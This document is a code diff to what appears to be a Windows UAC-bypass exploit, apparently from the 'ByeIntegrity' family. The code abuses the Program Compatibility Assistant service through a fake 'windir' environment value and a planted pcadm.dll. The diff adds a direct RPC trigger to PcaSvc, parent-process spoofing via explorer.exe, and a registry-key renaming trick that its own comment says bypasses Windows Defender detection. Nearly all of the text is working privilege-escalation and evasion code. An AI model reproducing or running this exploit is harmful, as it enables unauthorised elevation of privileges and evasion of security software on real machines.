@@ -5,6 +5,7 @@
 #include <intrin.h>
 #include <stdio.h>
 #include "resource.h"
+#include "pcasvc7.h"
 #define g_Instance ((HINSTANCE)&__ImageBase)
 
 extern IMAGE_DOS_HEADER __ImageBase;
@@ -60,6 +61,32 @@ typedef ULONG(WINAPI* EtwEventWriteNoRegistrationPtr)(
 	ULONG userDataCount,
 	PEVENT_DATA_DESCRIPTOR userData
 );
+
+void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
+{
+	return (void __RPC_FAR*)HeapAlloc(GetProcessHeap(), 0, cBytes);
+}
+
+void __RPC_USER midl_user_free(void* pBuffer)
+{
+	HeapFree(GetProcessHeap(), 0, pBuffer);
+}
+
+void AzGenRandomString(
+	PWSTR buffer
+)
+{
+	LARGE_INTEGER pc;
+	for (int i = 0; i < 8; ++i) {
+		QueryPerformanceCounter(&pc);
+
+		pc.QuadPart = RotateLeft64((ULONGLONG)(~pc.HighPart) ^ (ULONGLONG)(RotateRight64((ULONGLONG)pc.LowPart << 32,
+			(int)(pc.LowPart & ~0xFUL))), (int)(pc.HighPart & ~pc.LowPart));
+		pc.HighPart = pc.HighPart & ~pc.LowPart;
+		buffer[i] = ((ULONG)pc.HighPart % (90 - 65 + 1)) + 65;
+	}
+	buffer[8] = L'\0';
+}
 
 HRESULT BiStopWdiTask(
 	BOOLEAN trace
@@ -166,60 +193,59 @@ int BiTriggerMain(
 	return win32Status;
 }
 
-LRESULT CALLBACK BiWndClassTriggerProc(
-	HWND hWnd,
-	UINT msg,
-	WPARAM wParam,
-	LPARAM lParam
-)
-{
-	if (msg == WM_WINDOWPOSCHANGING) {
-		__ud2(); // cause an exception in a user callback. PcaSvc will detect this and attempt to launch the DM.
-	}
-	return DefWindowProcW(hWnd, msg, wParam, lParam);
-}
-
-int BiWndClassTriggerMain(
+RPC_BINDING_HANDLE BiCreatePcaRpcBinding(
 	void
 )
 {
-	int exitCode;
-	WNDCLASSEXW wc;
-	ATOM classAtom;
-	HWND window = NULL;
+	RPC_WSTR strBinding;
+	RPC_BINDING_HANDLE hBinding = NULL;
+	BYTE sid[SECURITY_MAX_SID_SIZE];
+	DWORD sidSize = SECURITY_MAX_SID_SIZE;
+	RPC_SECURITY_QOS_V3_W security;
+	RPC_STATUS rStatus;
 
-	SetErrorMode(SEM_NOGPFAULTERRORBOX);
-	wc.cbSize = sizeof(WNDCLASSEXW);
-	wc.lpszClassName = L"BiLegacyTriggerClass";
-	wc.hInstance = g_Instance;
-	wc.style = wc.cbClsExtra = wc.cbWndExtra = 0;
-	wc.hIcon = wc.hIconSm = wc.lpszMenuName =
-	wc.hbrBackground = wc.hCursor = NULL;
-	wc.lpfnWndProc = BiWndClassTriggerProc;
-
-	if (!(classAtom = RegisterClassExW(&wc))) {
-		exitCode = (int)GetLastError();
+	rStatus = RpcStringBindingComposeW(L"0767a036-0d22-48aa-ba69-b619480f38cb",
+		L"ncalrpc", NULL, NULL, NULL, &strBinding);
+	if (rStatus) {
+		wprintf(L"RpcStringBindingComposeW() failed. Error: %ld\n", rStatus);
+		goto eof;
+	}
+	rStatus = RpcBindingFromStringBindingW(strBinding, &hBinding);
+	RpcStringFreeW(&strBinding);
+	if (rStatus) {
+		wprintf(L"RpcStringBindingComposeW() failed. Error: %ld\n", rStatus);
+		goto eof;
+	}
+	rStatus = RpcBindingSetOption(hBinding, 12, 200);
+	if (rStatus) {
+		wprintf(L"RpcBindingSetOption() failed. Error: %ld\n", rStatus);
+		goto eof;
+	}
+	rStatus = (RPC_STATUS)CreateWellKnownSid(WinLocalSystemSid, NULL, sid, &sidSize);
+	if (!rStatus) {
+		wprintf(L"CreateWellKnownSid() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
 
-	if (!(window = CreateWindowExW(0, MAKEINTATOM(classAtom), NULL,
-		WS_OVERLAPPED, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
-		HWND_DESKTOP, NULL, g_Instance, NULL))) {
-		exitCode = (int)GetLastError();
+	ZeroMemory(&security, sizeof(RPC_SECURITY_QOS_V3_W));
+	security.Version = 3;
+	security.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
+	security.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
+	security.Sid = sid;
+	rStatus = RpcBindingSetAuthInfoExW(hBinding, NULL,
+		RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT,
+		0, 0, (RPC_SECURITY_QOS*)&security);
+	if (rStatus) {
+		wprintf(L"RpcBindingSetAuthInfoExW() failed. Error: %ld\n", rStatus);
 		goto eof;
 	}
 
-	ShowWindow(window, SW_NORMAL);
-	// program dies, won't need this...
-	exitCode = 0;
+	return hBinding;
 
 eof:
-	// same here...
-	if (window)
-		DestroyWindow(window);
-	if (classAtom)
-		UnregisterClassW(MAKEINTATOM(classAtom), g_Instance);
-	return exitCode;
+	if (hBinding)
+		RpcBindingFree(&hBinding);
+	return NULL;
 }
 
 int wmain(
@@ -229,8 +255,10 @@ int wmain(
 {
 	if (argv[0][0] == L'~')
 		return BiTriggerMain();
-	if (argv[0][0] == L'L')
-		return BiWndClassTriggerMain();
+	if (argv[0][0] == L'L') {
+		Sleep(2000);
+		return 0;
+	}
 	if (argv[0][0] == L'S') {
 		HRESULT hr;
 		HANDLE hSharedMemory;
@@ -268,23 +296,26 @@ end:
 	int exitCode = EXIT_FAILURE;
 	WCHAR cmdLine[2];
 	PROCESS_INFORMATION processInfo = { NULL, NULL, 0 };
-	STARTUPINFOW si;
+	STARTUPINFOEXW si;
 	HRSRC resource;
 	HGLOBAL loadedResource;
 	LPVOID payload;
 	HANDLE hPayload, hSharedMem = NULL;
-	BOOLEAN createdSystemFake = FALSE, createdPayload = FALSE, comReady = FALSE;
+	BOOLEAN createdSystemFake = FALSE, createdPayload = FALSE, comReady = FALSE, deleteList = FALSE;
 	DWORD writtenBytes;
 	HRESULT hr;
 	HMODULE pcaModule = NULL;
 	PcaMonitorProcessPtr PcaMonitorProcess = NULL; //fixme; 4703 without initialization for some reason...
 	DWORD curDirSize;
-	PWSTR curDir;
+	PWSTR curDir = NULL;
 	LSTATUS status;
 	BOOLEAN taskHijacked = FALSE, usesPca = TRUE;
 	PUCHAR pSharedMem = NULL;
 	WCHAR exeName[MAX_PATH];
-	DWORD exeNameSize;
+	ULONG_PTR exeNameSize;
+	SIZE_T attrSize;
+	HANDLE explorer = NULL;
+	WCHAR keyName[9];
 
 	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 == 1) {
 		cmdLine[0] = L'L';
@@ -296,6 +327,7 @@ end:
 		cmdLine[1] = L'\0';
 	}
 
+	si.lpAttributeList = NULL;
 	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
 	if (!SUCCEEDED(hr)) {
 		wprintf(L"CoInitializeEx() failed. Error: %lu\n", GetLastError());
@@ -356,21 +388,27 @@ end:
 	else {
 		BOOLEAN failed = TRUE;
 		SC_HANDLE scHandle, hService = NULL;
+		SERVICE_STATUS serviceStatus;
 
 		scHandle = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
 		if (!scHandle) {
 			wprintf(L"OpenSCManagerW() failed. Error: %lu\n", GetLastError());
 			goto cleanup;
 		}
-		hService = OpenServiceW(scHandle, L"PcaSvc", SERVICE_START);
+		hService = OpenServiceW(scHandle, L"PcaSvc", SERVICE_START | SERVICE_QUERY_STATUS);
 		if (!hService) {
 			wprintf(L"OpenServiceW() failed. Error: %lu\n", GetLastError());
 			goto cleanup;
 		}
-		if (!StartServiceW(hService, 0, NULL)) {
-			wprintf(L"StartServiceW() failed. Error: %lu\n", GetLastError());
+		if (!QueryServiceStatus(hService, &serviceStatus)) {
+			wprintf(L"QueryServiceStatus() failed. Error: %lu\n", GetLastError());
 			goto cleanup;
 		}
+		if (serviceStatus.dwCurrentState != SERVICE_RUNNING)
+			if (!StartServiceW(hService, 0, NULL)) {
+				wprintf(L"StartServiceW() failed. Error: %lu\n", GetLastError());
+				goto cleanup;
+			}
 
 		failed = FALSE;
 
@@ -391,66 +429,141 @@ cleanup:
 
 	curDirSize = GetCurrentDirectoryW(0, NULL);
 	curDir = HeapAlloc(GetProcessHeap(), 0, curDirSize * sizeof(WCHAR));
-	if (!GetCurrentDirectoryW(curDirSize, curDir)) {
-		HeapFree(GetProcessHeap(), 0, curDir);
-		wprintf(L"GetCurrentDirectoryW() failed. Error: %lu\n", GetLastError());
+	if (curDir) {
+		if (!GetCurrentDirectoryW(curDirSize, curDir)) {
+			wprintf(L"GetCurrentDirectoryW() failed. Error: %lu\n", GetLastError());
+			goto eof;
+		}
+	}
+	else {
+		wprintf(L"HeapAlloc() (0) failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
 
 	hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
 		0, ((exeNameSize + 1) * sizeof(WCHAR)) + (sizeof(BOOLEAN) * 2), L"ByeIntegrity8");
 	if (!hSharedMem) {
-		HeapFree(GetProcessHeap(), 0, curDir);
 		wprintf(L"CreateFileMappingW() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
 
 	pSharedMem = MapViewOfFile(hSharedMem, FILE_MAP_WRITE, 0, 0, 0);
 	if (!pSharedMem) {
-		HeapFree(GetProcessHeap(), 0, curDir);
 		wprintf(L"MapViewOfFile() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
 	memcpy(pSharedMem + (sizeof(BOOLEAN) * 2), exeName, (exeNameSize + 1) * sizeof(WCHAR));
 
-	status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir", REG_SZ, curDir,
-		curDirSize * sizeof(WCHAR));
+	ZeroMemory(&si.StartupInfo, sizeof(STARTUPINFOW));
+	si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
+
+	if (usesPca) {
+		if (!InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+			wprintf(L"InitializeProcThreadAttributeList() (0) failed. Error: %lu\n", GetLastError());
+			goto eof;
+		}
+		si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, attrSize);
+		if (si.lpAttributeList) {
+			if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
+				wprintf(L"InitializeProcThreadAttributeList() (1) failed. Error: %lu\n", GetLastError());
+				goto eof;
+			}
+
+			DWORD pid;
+
+			GetWindowThreadProcessId(GetShellWindow(), &pid);
+			if (pid) {
+				explorer = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
+				if (explorer) {
+					if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer,
+						sizeof(HANDLE), NULL, NULL)) {
+						wprintf(L"UpdateProcThreadAttribute() failed. Error: %lu\n", GetLastError());
+						goto eof;
+					}
+					deleteList = TRUE;
+				}
+				else {
+					wprintf(L"OpenProcess() failed. Error: %lu\n", GetLastError());
+					goto eof;
+				}
+			}
+			else {
+				wprintf(L"GetWindowThreadProcessId() failed. Error: %lu\n", GetLastError());
+				goto eof;
+			}
+		}
+		else {
+			wprintf(L"HeapAlloc() (1) failed. Error: %lu\n", GetLastError());
+			goto eof;
+		}
+	}
+
+	// Bypass Windows Defender filter driver catching custom windir creation
+	AzGenRandomString(keyName);
+	status = RegRenameKey(HKEY_CURRENT_USER, L"Environment", keyName);
 	if (status) {
-		HeapFree(GetProcessHeap(), 0, curDir);
+		wprintf(L"RegRenameKey() failed. LSTATUS: %lu\n", status);
+		goto eof;
+	}
+	status = RegSetKeyValueW(HKEY_CURRENT_USER, keyName, L"windir", REG_SZ, curDir,
+		curDirSize * sizeof(WCHAR));
+	RegRenameKey(HKEY_CURRENT_USER, keyName, L"Environment");
+	if (status) {
 		wprintf(L"RegSetKeyValueW() failed. LSTATUS: %lu\n", status);
 		goto eof;
 	}
 
-	ZeroMemory(&si, sizeof(STARTUPINFOW));
-	si.cb = sizeof(STARTUPINFOW);
-	status = (LSTATUS)CreateProcessW(exeName, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED,
-		NULL, NULL, &si, &processInfo);
+	status = (LSTATUS)CreateProcessW(exeName, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+		NULL, NULL, (LPSTARTUPINFOW)&si, &processInfo);
 	if (!status) {
-		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
-		HeapFree(GetProcessHeap(), 0, curDir);
 		wprintf(L"CreateProcessW() failed. Error: %lu\n", GetLastError());
+		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
 		goto eof;
 	}
 
-	if (usesPca)
+	if (usesPca) {
 		status = (LSTATUS)PcaMonitorProcess(processInfo.hProcess, 1, exeName, cmdLine,
 			curDir, PCA_MONITOR_PROCESS_NORMAL);
-	else
-		status = 0;
-	HeapFree(GetProcessHeap(), 0, curDir);
-	if (status) {
-		TerminateProcess(processInfo.hProcess, 0);
-		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
-		wprintf(L"PcaMonitorProcess() failed. Error: %lu\n", (DWORD)status);
-		goto eof;
-	}
-	ResumeThread(processInfo.hThread);
+		if (status) {
+			TerminateProcess(processInfo.hProcess, 0);
+			RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
+			wprintf(L"PcaMonitorProcess() failed. Error: %lu\n", (DWORD)status);
+			goto eof;
+		}
+		ResumeThread(processInfo.hThread);
 
-	WaitForSingleObject(processInfo.hProcess, INFINITE);
-	if (usesPca) {
-		GetExitCodeProcess(processInfo.hProcess, &curDirSize);
-		if (curDirSize) {
-			wprintf(L"Trigger process exited with error code: %lu\n", curDirSize);
+		WaitForSingleObject(processInfo.hProcess, INFINITE);
+		if (usesPca) {
+			GetExitCodeProcess(processInfo.hProcess, &curDirSize);
+			if (curDirSize) {
+				wprintf(L"Trigger process exited with error code: %#010x\n", curDirSize);
+				goto eofEarly;
+			}
+		}
+	}
+	else {
+		RPC_BINDING_HANDLE hBinding;
+		long pcaStatus;
+
+		hBinding = BiCreatePcaRpcBinding();
+		if (!hBinding) {
+			TerminateProcess(processInfo.hProcess, 0);
+			goto eofEarly;
+		}
+
+		ResumeThread(processInfo.hThread);
+		__try {
+			pcaStatus = RAiNotifyUserCallbackExceptionProcess(hBinding,
+				exeName, 1, processInfo.dwProcessId);
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {
+			wprintf(L"RAiNotifyUserCallbackExceptionProcess() exception: %#010x\n", GetExceptionCode());
+			RpcBindingFree(hBinding);
+			goto eofEarly;
+		}
+		RpcBindingFree(hBinding);
+		if (pcaStatus) {
+			wprintf(L"RAiNotifyUserCallbackExceptionProcess() failed. Error: %ld\n", pcaStatus);
 			goto eofEarly;
 		}
 	}
@@ -478,7 +591,7 @@ eofEarly:
 			exeName);
 
 	if (taskHijacked) {
-		_putws(L"[$] Exploit successful\n");
+		_putws(L">>> Exploit successful");
 		exitCode = 0;
 	}
 	for (int i = 0; i <= 2000; ++i) {
@@ -493,10 +606,14 @@ eof:
 		CloseHandle(processInfo.hThread);
 	if (processInfo.hProcess)
 		CloseHandle(processInfo.hProcess);
+	if (explorer)
+		CloseHandle(explorer);
 	if (pSharedMem)
 		UnmapViewOfFile(pSharedMem);
 	if (hSharedMem)
 		CloseHandle(hSharedMem);
+	if (curDir)
+		HeapFree(GetProcessHeap(), 0, curDir);
 	if (pcaModule)
 		FreeLibrary(pcaModule);
 	if (comReady)
@@ -505,5 +622,9 @@ eof:
 		DeleteFileW(L"system32\\pcadm.dll");
 	if (createdSystemFake)
 		RemoveDirectoryW(L"system32");
+	if (deleteList)
+		DeleteProcThreadAttributeList(si.lpAttributeList);
+	if (si.lpAttributeList)
+		HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
 	return exitCode;
 }
